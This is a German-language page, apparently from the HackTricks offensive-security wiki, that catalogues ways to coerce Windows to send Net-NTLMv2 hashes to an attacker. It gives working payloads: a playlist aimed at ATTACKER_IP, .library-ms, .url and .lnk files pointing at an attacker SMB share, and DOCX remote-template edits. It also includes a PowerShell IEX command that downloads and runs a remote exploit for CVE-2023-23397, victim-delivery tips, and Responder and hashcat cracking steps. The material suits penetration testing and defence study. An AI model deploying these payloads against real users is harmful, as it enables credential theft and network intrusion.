# Orte, um NTLM creds zu stehlen

{{#include ../../banners/hacktricks-training.md}}

**Siehe alle großartigen Ideen von [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) vom Download einer Microsoft Word-Datei online bis zur ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player-Playlists (.ASX/.WAX)

Wenn Sie ein Ziel dazu bringen können, eine von Ihnen kontrollierte Windows Media Player‑Playlist zu öffnen oder in der Vorschau anzuzeigen, können Sie Net‑NTLMv2 leak, indem Sie den Eintrag auf einen UNC-Pfad zeigen. WMP wird versuchen, die referenzierte Mediendatei über SMB abzurufen und authentifiziert sich dabei implizit.

Beispiel payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Sammlung und cracking-Ablauf:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### In ZIP eingebettete .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer behandelt .library-ms-Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Wenn die Bibliotheksdefinition auf einen entfernten UNC-Pfad zeigt (z. B. \\attacker\share), führt bereits das Durchsuchen/Starten der .library-ms innerhalb des ZIP dazu, dass Explorer den UNC abfragt und NTLM-Authentifizierung an den attacker sendet. Dies ergibt einen NetNTLMv2, der cracked offline oder möglicherweise relayed werden kann.

Minimale .library-ms, die auf einen attacker-UNC zeigt
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Erstelle die .library-ms-Datei mit dem obigen XML (setze deine IP/Hostname).
- Komprimiere sie (unter Windows: Senden an → Compressed (zipped) folder) und liefere die ZIP an das Ziel.
- Starte einen NTLM-Capture-Listener und warte, bis das Opfer die .library-ms aus dem ZIP öffnet.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows verarbeitete die erweiterte MAPI-Eigenschaft PidLidReminderFileParameter in Kalendereinträgen. Wenn diese Eigenschaft auf einen UNC-Pfad verweist (z. B. \\attacker\share\alert.wav), würde Outlook das SMB-Share kontaktieren, wenn die Erinnerung ausgelöst wird, wobei ein leak der Net‑NTLMv2-Anmeldeinformationen des Benutzers ohne jeglichen Klick ausgelöst wurde. Dies wurde am 14. März 2023 gepatcht, ist aber weiterhin hochrelevant für legacy/untouched fleets und für historische Incident Response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener-Seite:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Hinweise
- Ein Opfer muss lediglich Outlook for Windows ausführen, wenn die Erinnerung ausgelöst wird.
- Der leak liefert Net‑NTLMv2, geeignet für offline cracking oder relay (nicht pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer stellt Verknüpfungssymbole automatisch dar. Neuere Forschung zeigte, dass selbst nach Microsoft’s April 2025 patch for UNC‑icon shortcuts weiterhin NTLM‑Authentifizierung ohne Klicks ausgelöst werden konnte, indem das Shortcut‑Ziel auf einem UNC‑Pfad gehostet und das Icon lokal gehalten wurde (patch bypass assigned CVE‑2025‑50154). Schon das bloße Anzeigen des Ordners veranlasst Explorer, Metadaten vom entfernten Ziel abzurufen und NTLM an den attacker SMB server zu senden.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Programmverknüpfung payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Zustellungs-Ideen
- Lege die Verknüpfung in eine ZIP-Datei und bringe das Opfer dazu, sie zu durchsuchen.
- Platziere die Verknüpfung auf einem beschreibbaren Share, das das Opfer öffnen wird.
- Kombiniere sie mit anderen Köderdateien im selben Ordner, damit Explorer eine Vorschau der Elemente anzeigt.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office-Dokumente können auf eine externe Vorlage verweisen. Wenn du die angehängte Vorlage auf einen UNC-Pfad setzt, authentifiziert sich beim Öffnen des Dokuments gegenüber SMB.

Minimale DOCX relationship-Änderungen (inside word/):

1) Bearbeite word/settings.xml und füge den angehängten Vorlagenverweis hinzu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Bearbeite word/_rels/settings.xml.rels und verweise rId1337 auf deinen UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) In .docx neu verpacken und zustellen. Starte deinen SMB capture listener und warte auf das open.

Für post-capture Ideen zum Relaying oder Abusing von NTLM, siehe:

{{#ref}}
README.md
{{#endref}}


## Referenzen
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
